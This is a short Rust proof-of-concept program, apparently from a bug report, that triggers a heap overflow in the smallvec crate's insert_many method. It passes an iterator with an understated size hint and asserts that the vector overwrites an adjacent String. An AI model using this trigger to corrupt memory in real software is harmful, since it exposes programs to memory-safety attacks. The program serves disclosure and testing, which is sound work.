extern crate smallvec;

// #![forbid(unsafe_code)]

use smallvec::SmallVec;

fn main() {
    let mut v: SmallVec<[u8; 0]> = SmallVec::new();

    // Spill on heap
    v.push(123);

    // Allocate string on heap
    let s = String::from("Hello!");
    println!("{}", s);

    // Prepare an iterator with small lower bound
    let mut iter = (0u8..=255).filter(|n| n % 2 == 0);
    assert_eq!(iter.size_hint().0, 0);

    // Triggering the bug
    v.insert_many(0, iter);

    // Uh oh, heap overflow made smallvec and string to overlap
    assert!(v.as_ptr_range().contains(&s.as_ptr()));

    // String is corrupted
    println!("{}", s);
}